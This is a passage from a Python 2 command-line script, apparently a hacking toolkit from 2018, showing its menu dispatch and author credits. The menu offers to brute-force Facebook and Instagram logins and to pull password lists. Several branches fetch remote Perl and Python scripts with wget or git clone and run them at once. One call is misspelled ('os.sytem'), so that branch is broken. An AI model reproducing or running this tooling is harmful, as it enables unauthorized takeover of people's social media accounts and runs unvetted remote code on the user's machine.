  {r}[{g}6{r}]{y}  Brute Facebo²k With PhoneNumbers
  {r}[{g}7{r}]{y}  Brute Instagram 
  {r}[{g}8{r}]{y}  Wanna Secure Password
  {r}[{g}9{r}]{y}  Install Another Tools(With JoganInstaller)
  {r}[{g}69{r}]{y} About
  {r}[{g}ctrl-c{r}]{y} Exit 
  {r}<{y}------------------------------------------------------{r}>""".format(r=la7mar,g=la5dhar,b=lazra9,y=lasfar)

 zack=raw_input("  %ssmash> %s"%(ramadi,lazra9))
 clear()
 print logon+'\n'
 if zack =='1':
  toro()
 elif zack=='0':
  lvl69()
 elif zack =='2':
  allmight()
 elif zack =='3':
  medoria()
 elif zack =='4':
  os.system('git clone https://github.com/m4rktn/passlist && clear && echo u got it ^^ && cd passlist && ls')
 elif zack =='5':
  if not os.path.isfile('fbsmash.pl'):
    if os.name=='nt':
      print "Plz Download This Tool \n link > https://github.com/m4rktn/xsmash/fbsmash.pl"
      raw_input('Press Enter To quit ...')
      exit()
    else:
      os.sytem('wget https://raw.github.com/m4rktn/xsmash/master/fbsmash.pl')
      os.system('perl fbsmash.pl')
  else:
    os.system('perl fbsmash.pl')
 elif zack =='6':
  beloumi()
  os.system('perl zzzz.pl')
 elif zack =='7':
   InstaBrute()
 elif zack =='8':
  uraraka()
 elif zack =='9':
  if not os.path.isdir('jogan'):
    os.system('git clone https://github.com/m4rktn/jogan && cd jogan && python2 jogan.py')
  else:
    os.system('cd jogan && python2 jogan.py')
 elif zack =='69':
   print """
  {re}~{r}> {g}Ohayo {b}Walkers{r}({g}Hello {b}Walkers{r})
  {re}~{r}> About {re}: {y}
     Coder     {re}: {b}M4rkW4lk3r {y}
     Facebook  {re}: {r}[{b}https://www.facebook.com/officiel.zack{r}] {y}  
     Instagram {re}: {r}[{b}https://www.instagram.com/pip3.py{r}]  {y}
     E-mail    {re}: {r}[{b} aptget1337@gmail.com {r}] {y}
     Youtube   {re}: {r}[{b}https://youtube.com/c/M4rkWalker Or Mark Walker{r}]{y}
     Site      {re}: {r}[{b}http://m4rkwalker.ga{r}]{y}
     Donating  {re}: {b}I Forget my Btc's Adress Just Contact Me Bro
  {re}~{r}> {r}<{y}TNT{r}>{g} 1.2.3 Viva La Tunisie {r}</{y}TNT{r}>
  {re}~{r}> {r}({c}C{r}){c}opyright 2018 - M4rkW4lk3r \033[00m""".format(r=la7mar,b=lazra9,g=la5dhar,y=lasfar,re=ramadi,m=movv,c=cyan)
 
 else:
  print "%s Thnx To Eat Mlawy And Chips\n Goood Bye %s"%(la5dhar,labyadh)
  exit()

#######  Begin & End  #######
if __name__ == '__main__':
  try:
    clear()
    if not os.path.isdir('xrzlts'):
      os.mkdir('xrzlts')
    else:
      pass
    bokunohero()
  except KeyboardInterrupt:
    print "%s Thnx To Eat Mlawy And Chips\n Goood Bye %s"%(la5dhar,labyadh)
sys.exit()
###  ShowTime  ### 
#   ___   ___    #
#    8     8     #
#      o.o       #
#   ,_______,    #
#                # 
##################
